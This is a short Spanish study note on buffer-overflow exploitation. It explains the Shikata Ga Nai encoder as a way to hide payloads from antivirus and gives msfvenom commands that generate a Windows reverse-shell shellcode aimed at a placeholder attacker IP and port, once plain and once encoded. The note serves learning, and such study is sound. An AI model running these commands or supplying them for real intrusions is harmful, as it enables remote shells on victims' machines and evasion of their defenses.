---
Tema: "[[Buffer Overflow]]"
---
Una vez que tenemos el payload con los badchars filtrados la idea es meter  un payload malicioso o shellcode a la pila ESP

para insertar un shellcode hay que tener en cuenta usar un [[enconder]] por ejemplo ***shikata ga nai***

>[!important]
>Un**Shikata Ga Nai encoder** es una herramienta de codificación utilizada principalmente en el framework de seguridad Metasploit, cuyo nombre en japonés significa "no hay remedio" o "no se puede evitar". Su función es **ofuscar (ocultar)** el código malicioso (payloads) para que no sea detectado por los antivirus tradicionales, usando técnicas como XOR polimórfico y aleatorización de instrucciones, creando una versión única del código en cada uso.

lo haremos con una de las herrmientas de metasploit el cual es [[msfvenom]]

para buscar payloads
```sh
msfvenom -l payloads
```

para buscar encoders 
```sh
msfvenom -l encoders
```


genericamente para generar un shellcode puede ser asi

```sh
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ip_atacante LPORT=puerto_atacante -f py
```
-p: 
--platform
-a
-f

lo que pasa es que no especificamos los badchars y por ahi 
[[msfvenom]] no pone ningun encoder por lo que a este comando le falta *encoder* y los *badchars*

el completo seria:
```sh
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ip_atacante LPORT=puerto_atacante -f py -e x86/shikata_ga_nai
```
